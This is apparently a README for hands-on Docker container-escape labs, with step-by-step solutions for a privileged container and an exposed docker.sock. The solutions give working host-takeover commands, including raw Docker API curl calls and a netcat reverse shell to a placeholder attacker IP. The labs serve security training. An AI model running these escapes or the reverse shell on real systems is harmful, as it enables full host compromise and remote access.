# docker-escape-labs
Docker labs to practice container escape, for educational purpose only.

## chall01 - privileged

```
docker build -t ctf-privileged .
docker run --rm -it --privileged ctf-privileged
```

<details>
  <summary>Solution</summary>

  1. Retrieve the host disk
  ```
  fdisk -l
  ```
  2. Create a new folder
  ```
  mkdir /mnt/host
  ```
  3. Mount the host disk into the new folder (because of `--privileged`)
  ```
  mount /dev/sda1 /mnt/host
  ```
  4. Change the chroot to the new folder
  ```
  chroot /mnt/host /bin/bash
  ```
</details>

## chall02 - docker.sock

```
docker build -t ctf-socket .
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ctf-socket
```

<details>
  <summary>Solution1</summary>

  1. Access to `docker.sock` allows you to create new containers with full access to the host
  ```
  docker run -v /:/host -it --rm ubuntu chroot /host /bin/bash
  ```
</details>

<details>
  <summary>Solution2</summary>
  
  You can do the same using the Docker api, with `curl`
  1. Create the container
  ```
  curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["chroot", "/host"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container
  ```
  You may need to pull the image if it does not exist!
  ```
  curl --unix-socket /var/run/docker.sock -X POST "http://localhost/v1.41/images/create?fromImage=alpine&tag=latest"
  ```
  2. Launch the container
  ```
  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
  ```
  3. Get a shell
  ```
  docker exec -it escape_container sh
  ```
  You can do the same to get a reverse shell
  ```
  # Create the container
  curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["sh", "-c", "chroot /host nc <IP_ATTAQUANT> <PORT> -e /bin/sh"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container

  # Start the container
  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
  ```
</details>
